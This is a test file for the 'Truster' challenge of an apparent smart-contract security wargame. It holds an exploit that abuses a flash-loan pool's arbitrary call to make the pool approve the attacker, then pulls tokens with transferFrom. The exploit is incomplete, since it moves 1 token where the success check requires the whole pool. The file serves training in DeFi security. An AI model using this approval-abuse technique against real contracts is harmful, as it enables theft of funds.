const { ethers } = require("hardhat");
const { expect } = require("chai");

var Web3 = require("web3");

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const web3 = new Web3("https://cloudflare-eth.com");

    //TODO: pass approve as data

    const data = web3.eth.abi.encodeFunctionCall(
      {
        name: "approve",
        type: "function",
        inputs: [
          {
            type: "address",
            name: "spender",
          },
          {
            type: "uint256",
            name: "amount",
          },
        ],
      },
      [attacker.address, "100000000000000000000000000"]
    );
    await this.pool.flashLoan(0, attacker.address, this.token.address, data);

    console.log(
      await this.token.allowance(this.pool.address, attacker.address)
    );

    await this.token.transferFrom(
      this.pool.address,
      attacker.address,
      ethers.utils.parseEther("1")
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
